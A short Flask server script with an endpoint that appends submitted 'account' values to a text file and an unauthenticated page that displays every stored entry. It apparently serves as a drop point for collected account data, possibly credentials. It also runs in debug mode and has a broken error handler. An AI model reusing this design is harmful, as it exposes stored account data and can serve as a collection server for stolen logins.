from flask import *
from datetime import datetime

import os
import platform


app = Flask(__name__)

@app.route('/')
def homepage():
	return """
	    <h1>Sever OK</h1>
	    """

	
#========================upload file=====================================
 
@app.route('/upload', methods = ['POST'])  
def success():
	if request.method == 'POST':
		try:
			account = request.form.get('account')
			with open("account.txt", 'a', encoding = 'utf-8') as f:
				f.write(account+"\n")
			return "success"
		except Exception as e:
			return "error: "+ e

#===============================chat=====================================
@app.route('/get-account')  
def chat():
	with open("account.txt", "r") as f:
    		content = f.read()
	return render_template("log.html", content=content)
#========================================================================

if __name__ == '__main__':
	app.run(debug=True, use_reloader=True)

